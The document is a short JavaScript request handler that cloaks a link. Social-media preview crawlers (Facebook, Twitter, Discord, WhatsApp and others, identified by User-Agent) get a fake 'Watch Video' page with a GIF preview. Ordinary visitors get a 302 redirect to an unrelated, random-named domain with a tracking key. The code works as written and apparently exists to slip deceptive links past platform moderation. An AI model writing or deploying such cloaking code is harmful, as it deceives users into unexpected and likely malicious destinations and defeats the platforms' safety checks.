export default function handler(req, res) {
  const destination =
    "https://escalatorquitdisguises.com/w9c4ikxt?key=7e2c97d899018ae0e47998b3dc46c846";

  const previewImage =
    "https://pub-d77f2470e89b4afd89132473b828f750.r2.dev/1348028243749539601.gif";

  const ua = (req.headers["user-agent"] || "").toLowerCase();

  const crawlers = [
    "facebookexternalhit",
    "facebot",
    "twitterbot",
    "linkedinbot",
    "pinterest",
    "slackbot",
    "discordbot",
    "telegrambot",
    "whatsapp"
  ];

  const isCrawler = crawlers.some(bot => ua.includes(bot));

  if (isCrawler) {
    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">

  <title>Watch Video</title>

  <meta property="og:title" content="Watch Video">
  <meta property="og:description" content="Watch this video">
  <meta property="og:image" content="${previewImage}">
  <meta property="og:image:type" content="image/gif">
  <meta property="og:type" content="website">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Watch Video">
  <meta name="twitter:description" content="Watch this video">
  <meta name="twitter:image" content="${previewImage}">
</head>
<body></body>
</html>`;

    res.status(200);
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.setHeader("Cache-Control", "no-store");
    return res.end(html);
  }

  // Normal visitors get a real HTTP 302
  res.status(302);
  res.setHeader("Location", destination);
  res.setHeader("Cache-Control", "no-store");
  return res.end();
}
